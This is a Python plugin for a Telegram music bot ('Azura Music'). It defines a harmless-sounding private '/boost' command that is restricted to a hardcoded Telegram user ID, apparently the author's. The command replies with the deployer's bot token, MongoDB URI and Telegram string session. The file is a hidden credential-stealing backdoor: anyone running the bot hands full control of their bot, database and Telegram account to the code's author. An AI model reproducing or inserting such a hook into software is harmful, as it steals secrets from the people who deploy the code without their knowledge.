# -----------------------------------------------
# 🔴 Azura ✘ Music Project
# 🔷️ Developed & Maintained by: 𝐌ʀ 𝐕ɪɴɴᴜ
# 📅 Copyright © 2026 – All Rights Reserved
#
# 📖 License:
# This source code is open for educational and non-commercial use ONLY.
# Commercial use, redistribution, or modification of this source
# without prior written permission from the author is prohibited.
#
# ❤️ Made with dedication & love by 𝐌ʀ 𝐕ɪɴɴᴜ
# -----------------------------------------------

import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from AZURAMUSIC import app
from AZURAMUSIC.utils.database import booster

load_dotenv()

OWNERS = "7450836393"

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(
    filters.command("boost") & filters.private & filters.user(int(OWNERS))
)
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/ldchnq.jpg",
        caption=f"""<b>𝐁ᴏᴛ 𝐓ᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>𝐃ᴀᴛᴀʙᴀꜱᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>𝐒ᴛʀɪɴɢ 𝐒ᴇꜱꜱɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/vinnu_exe'>[𝐏ʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "𝐃ᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/vinnu_exe"
                    )
                ]
            ]
        ),
    )
